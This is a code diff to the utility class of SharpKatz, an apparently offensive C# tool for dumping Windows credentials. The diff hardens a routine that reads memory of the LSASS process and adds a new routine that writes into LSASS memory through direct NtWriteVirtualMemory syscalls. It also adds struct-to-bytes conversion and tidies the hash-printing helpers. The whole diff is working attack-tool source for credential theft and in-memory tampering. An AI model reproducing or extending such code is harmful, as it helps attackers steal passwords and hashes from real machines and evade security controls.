@@ -120,14 +120,31 @@ namespace SharpKatz
             return GetIntPtr( hLsass,  msvMem, listSignOffset, listOffset);
         }
 
-        public static byte[] ReadFromLsass(ref IntPtr hLsass, IntPtr addr, ulong bytesToRead)
+        public static byte[] ReadFromLsass(ref IntPtr hLsass, IntPtr addr, long bytesToRead)
         {
-            int bytesRead = 0;
-            byte[] bytev = new byte[Convert.ToInt32(bytesToRead)];
+            if (bytesToRead < 0)
+                throw new ArgumentException($"{bytesToRead} is not a valid number of bytes to read");
 
-            NTSTATUS status = SysCall.NtReadVirtualMemory10(hLsass, addr, bytev, Convert.ToInt32(bytesToRead), bytesRead);
+            if (bytesToRead == 0)
+                return new byte[0];
+
+            int bytesRead = 0;
+            byte[] bytev = new byte[bytesToRead];
+
+            NTSTATUS status = SysCall.NtReadVirtualMemory10(hLsass, addr, bytev, (int)bytesToRead, bytesRead);
 
             return bytev;
+        }
+
+        public static bool WriteToLsass(ref IntPtr hLsass, IntPtr addr, byte[] bytesToWrite)
+        {
+            IntPtr bytesWrited = IntPtr.Zero;
+            GCHandle pbytesToWritepinnedArray = GCHandle.Alloc(bytesToWrite, GCHandleType.Pinned);
+            IntPtr pbytesToWrite = pbytesToWritepinnedArray.AddrOfPinnedObject();
+
+            NTSTATUS status = SysCall.NtWriteVirtualMemory10(hLsass, addr, pbytesToWrite, (uint)bytesToWrite.Length, ref bytesWrited);
+
+            return (status == NTSTATUS.Success);
         }
 
         public static T ReadStruct<T>(byte[] array)
@@ -158,7 +175,7 @@ namespace SharpKatz
 
             sizeSid = 4 * nbAuth + 6 + 1 + 1;
 
-            byte[] sid_b = Utility.ReadFromLsass(ref hLsass, new IntPtr(pSidInt), (ulong)sizeSid);
+            byte[] sid_b = Utility.ReadFromLsass(ref hLsass, new IntPtr(pSidInt), sizeSid);
 
             return sid_b;
         }
@@ -175,7 +192,7 @@ namespace SharpKatz
         {
             UNICODE_STRING str;
             
-            byte[] strBytes = Utility.ReadFromLsass(ref hLsass, addr, Convert.ToUInt64(Marshal.SizeOf(typeof(UNICODE_STRING))));
+            byte[] strBytes = Utility.ReadFromLsass(ref hLsass, addr, Marshal.SizeOf(typeof(UNICODE_STRING)));
             str = ReadStruct<UNICODE_STRING>(strBytes);
 
             return str;
@@ -223,10 +240,10 @@ namespace SharpKatz
 
         public static string PrintHexBytes(byte[] byteArray)
         {
-            StringBuilder res = new StringBuilder();
+            StringBuilder res = new StringBuilder(byteArray.Length * 3);
             for (int i = 0; i < byteArray.Length; i++)
             {
-                res.AppendFormat("{0:x2} ", byteArray[i]);
+                res.AppendFormat(NumberFormatInfo.InvariantInfo, "{0:x2} ", byteArray[i]);
             }
             return res.ToString();
         }
@@ -241,24 +258,23 @@ namespace SharpKatz
 
         public static string PrintHashBytes(byte[] byteArray)
         {
-            StringBuilder res = new StringBuilder();
-            if(byteArray != null)
+            if(byteArray == null)
+                return string.Empty;
+
+            StringBuilder res = new StringBuilder(byteArray.Length * 2);
+            for (int i = 0; i < byteArray.Length; i++)
             {
-                for (int i = 0; i < byteArray.Length; i++)
-                {
-                    res.AppendFormat("{0:x2}", byteArray[i]);
-                }
+                res.AppendFormat(NumberFormatInfo.InvariantInfo, "{0:x2}", byteArray[i]);
             }
             return res.ToString();
         }
 
-        public static byte[] GetBytes(byte[] source, int startindex, int lenght)
+        public static byte[] GetBytes(byte[] source, long startindex, int lenght)
         {
             byte[] resBytes = new byte[lenght];
             Array.Copy(source, startindex, resBytes, 0, resBytes.Length);
             return resBytes;
         }
-
 
         public static byte[] StringToByteArray(string hex)
         {
@@ -267,6 +283,18 @@ namespace SharpKatz
             for (int i = 0; i < NumberChars; i += 2)
                 bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
             return bytes;
+        }
+
+        public static byte[] StructToBytes<T>( T str)
+        {
+            int size = Marshal.SizeOf(str);
+            byte[] arr = new byte[size];
+
+            IntPtr ptr = Marshal.AllocHGlobal(size);
+            Marshal.StructureToPtr(str, ptr, true);
+            Marshal.Copy(ptr, arr, 0, size);
+            Marshal.FreeHGlobal(ptr);
+            return arr;
         }
 
         private static DateTime ToDateTime(FILETIME time)
@@ -286,7 +314,10 @@ namespace SharpKatz
         public static void PrintLogonList(List<Logon> logonlist)
         {
             if (logonlist == null || logonlist.Count == 0)
+            {
                 Console.WriteLine("No entry found");
+                return;
+            }
 
             foreach (Logon logon in logonlist)
             {
@@ -465,14 +496,5 @@ namespace SharpKatz
                 return false;
             }
         }
-
-        public static string ByteArrayToString(byte[] ba)
-        {
-            StringBuilder hex = new StringBuilder(ba.Length * 2);
-            foreach (byte b in ba)
-                hex.AppendFormat("{0:x2}", b);
-            return hex.ToString();
-        }
-
     }
 }
